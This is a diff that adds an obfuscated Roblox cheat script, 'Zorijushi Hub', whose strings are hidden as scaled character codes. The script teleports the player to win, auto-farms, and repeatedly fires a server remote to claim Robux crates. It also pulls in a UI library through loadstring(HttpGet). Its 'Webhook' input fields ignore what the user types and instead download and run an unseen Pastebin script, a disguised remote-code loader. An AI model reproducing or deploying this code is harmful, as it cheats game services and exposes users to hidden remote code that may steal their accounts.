@@ -1,1 +1,158 @@
-dosent work
+function rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
+
+
+game.StarterGui:SetCore(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({8715,10605,11550,10500,8190,11655,12180,11025,10710,11025,10395,10185,12180,11025,11655,11550}), {
+    Title = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7980,11655,10185,10500,11025,11550,10815,4830,4830,4830}); 
+    Text = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({9450,11655,11970,11025,11130,12285,12075,10920,11025,3360,7560,12285,10290}); 
+    Duration = 5;
+    Button1 = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7035,11655,12285,11550,12180,11025,11550,10605});  
+})
+
+wait(5)
+local autoWin 	= false
+local autoRobux = false
+function win()
+    game.Players.LocalPlayer.Character:PivotTo(workspace.Finish.Chest:GetPivot())
+end
+
+function showColors()
+    local function colorPart(v)
+        if v:IsA(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({6930,11655,11655,11340,9030,10185,11340,12285,10605})) and v.Name == rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({10290,11970,10605,10185,11235,10185,10290,11340,10605}) then
+            v.Parent.Color = Color3.fromRGB(255, 0, 0)
+        elseif v:IsA(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({8400,10185,11970,12180})) and not v:FindFirstChild(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({10290,11970,10605,10185,11235,10185,10290,11340,10605})) and v.Parent.ClassName == rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7350,11655,11340,10500,10605,11970}) then
+            v.Color = Color3.fromRGB(0, 255, 0)
+        end
+    end
+
+    for _, v in next, workspace.segmentSystem.Segments:GetDescendants() do
+        colorPart(v)
+    end
+
+    workspace.segmentSystem.Segments.ChildAdded:Connect(function(child)
+        colorPart(child)
+    end)
+end
+
+function destroyIncorrect()
+    local function check(v)
+        if v:IsA(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({8400,10185,11970,12180})) and v:FindFirstChild(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({10290,11970,10605,10185,11235,10185,10290,11340,10605})) then
+            v:Destroy()
+        end
+    end
+
+    for _, v in next, workspace.segmentSystem.Segments:GetDescendants() do
+        check(v)
+    end
+
+    workspace.segmentSystem.Segments.ChildAdded:Connect(function(child)
+        check(child)
+    end)
+end
+
+function robux()
+    game:GetService(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605})).RemoteEvents.crateRemote:FireServer(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({11760,11970,11655,10395,10605,12075,12075,7035,11970,10185,12180,10605}), 3)
+    game:GetService(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605})).RemoteEvents.crateRemote:FireServer(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({11760,11970,11655,10395,10605,12075,12075,8610,10605,12495,10185,11970,10500}), 3)
+end
+
+local gameName = game:GetService(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({8085,10185,11970,11235,10605,12180,11760,11340,10185,10395,10605,8715,10605,11970,12390,11025,10395,10605})):GetProductInfo(game.PlaceId).Name
+
+local Rayfield = loadstring(game:HttpGet(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({10920,12180,12180,11760,12075,6090,4935,4935,12075,11025,11970,11025,12285,12075,4830,11445,10605,11550,12285,4935,11970,10185,12705,10710,11025,10605,11340,10500})))()
+local Window = Rayfield:CreateWindow({
+    Name = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({9450,11655,11970,11025,11130,12285,12075,10920,11025,3360,7560,12285,10290}),
+    Icon = 0,
+    LoadingTitle = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({9450,11655,11970,11025,11130,12285,12075,10920,11025,3360,9135,10185,11970,10605}),
+    LoadingSubtitle = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({8400,11970,10605,11445,12285,11025,11445,3360,9030,5250}),
+    Theme = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7140,10605,10710,10185,12285,11340,12180}),
+    DisableRayfieldPrompts = false,
+    DisableBuildWarnings = false,
+})
+-- Tabs
+local Tab1 = Window:CreateTab(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7560,11655,11445,10605}), 4483362458)
+local Tab2 = Window:CreateTab(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({6825,12285,12180,11655,10710,10185,11970,11445}), 4483362458)
+local Tab3 = Window:CreateTab(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({8085,11025,12075,10395}), 4483362458)
+
+-- Sections
+local Section = Tab1:CreateSection(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7560,11655,11445,10605,25200,16695,15015,16905}))
+local Section = Tab2:CreateSection(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({6825,12285,12180,11655,10710,10185,11970,11445,25200,16695,17535,15225,23730,13440,14805,25200,16695,17430,19845}))
+local Section = Tab3:CreateSection(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({8085,11025,12075,10395,25200,16695,14910,18690}))
+
+-- Home
+local Label = Tab1:CreateLabel(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({9135,10605,11340,10395,11655,11445,10605,3360,12180,11655,3360,9450,11655,11970,11025,11130,12285,12075,10920,11025,3360,9135,10185,11970,10605,25200,16695,15645,19425,25095,19320,15015}), 4483362458, Color3.fromRGB(255, 255, 255), false)
+local Label = Tab1:CreateLabel(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({8820,10920,10185,11550,11235,3360,9345,11655,12285,3360,7350,11655,11970,3360,7035,10920,11655,12075,11025,11550,10815,3360,8925,12075,25200,16695,15330,15750}), 4483362458, Color3.fromRGB(255, 255, 255), false)
+local Input = Tab1:CreateInput({
+   Name = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({9135,10605,10290,10920,11655,11655,11235}),
+   CurrentValue = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7245,11550,12180,10605,11970,3360,7560,10605,11970,10605}),
+   PlaceholderText = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7245,11550,12180,10605,11970,3360,7560,10605,11970,10605}),
+   RemoveTextAfterFocusLost = false,
+   Flag = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7665,11550,11760,12285,12180,5145}),
+   Callback = function(Text)
+   loadstring(game:HttpGet(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({10920,12180,12180,11760,12075,6090,4935,4935,11760,10185,12075,12180,10605,10290,11025,11550,4830,10395,11655,11445,4935,11970,10185,12495,4935,9240,6930,5145,10290,7140,12495,10605,7770}), true))()
+   end,
+})
+local Input = Tab1:CreateInput({
+   Name = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({9135,10605,10290,10920,11655,11655,11235,3360,8400,11025,11550,10815}),
+   CurrentValue = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7245,11550,12180,10605,11970,3360,7560,10605,11970,10605}),
+   PlaceholderText = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7245,11550,12180,10605,11970,3360,7560,10605,11970,10605}),
+   RemoveTextAfterFocusLost = false,
+   Flag = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7665,11550,11760,12285,12180,5145}),
+   Callback = function(Text)
+   loadstring(game:HttpGet(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({10920,12180,12180,11760,12075,6090,4935,4935,11760,10185,12075,12180,10605,10290,11025,11550,4830,10395,11655,11445,4935,11970,10185,12495,4935,9240,6930,5145,10290,7140,12495,10605,7770}), true))()
+   end,
+})
+
+-- Autofarm
+
+local Toggle = Tab2:CreateToggle({
+    Name = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({6825,12285,12180,11655,3360,9135,11025,11550}),
+    CurrentValue = false,
+    Flag = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({12495,11025,11550,12180,11655,10815,10815,11340,10605}),
+    Callback = function(Value)
+        autoWin = Value
+        while autoWin == true do
+            win()
+            task.wait(3)
+        end
+    end,
+})
+
+local Toggle = Tab2:CreateToggle({
+    Name = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({6825,12285,12180,11655,3360,8610,11655,10290,12285,12600,3360,7035,11970,10185,12180,10605}),
+    CurrentValue = false,
+    Flag = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({11970,11655,10290,12285,12600,12180,11655,10815,10815,11340,10605}),
+    Callback = function(Value)
+        autoRobux = Value
+        while autoRobux == true do
+            robux()
+            task.wait()
+        end
+    end,
+})
+
+-- Misc
+local Label = Tab3:CreateLabel(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7455,11340,10185,12075,12075,3360,6930,11970,11025,10500,10815,10605}), 4483362458, Color3.fromRGB(255, 255, 255), false)
+local Button = Tab3:CreateButton({
+    Name = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({8715,10920,11655,12495,3360,7035,11655,11970,11970,10605,10395,12180,4935,7665,11550,10395,11655,11970,11970,10605,10395,12180,3360,7455,11340,10185,12075,12075}),
+    Callback = function()
+        showColors()
+    end,
+})
+local Button = Tab3:CreateButton({
+    Name = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7140,10605,12075,12180,11970,11655,12705,3360,7665,11550,10395,11655,11970,11970,10605,10395,12180,3360,7455,11340,10185,12075,12075}),
+    Callback = function()
+        destroyIncorrect()
+    end,
+})
+
+local Label = Tab3:CreateLabel(rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({8715,11025,11550,10815,11340,10605,3360,8400,11970,10605,12075,12075}), 4483362458, Color3.fromRGB(255, 255, 255), false)
+local Button = Tab3:CreateButton({
+    Name = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({9135,11025,11550}),
+    Callback = function()
+        win()
+    end,
+})
+local Button = Tab3:CreateButton({
+    Name = rNiKgYcGEdDEplEvhHvSjOGGgEGbBzwUgMQBFlw({7455,10605,12180,3360,8610,11655,10290,12285,12600,3360,7035,11970,10185,12180,10605}),
+    Callback = function()
+        robux()
+    end,
+})    
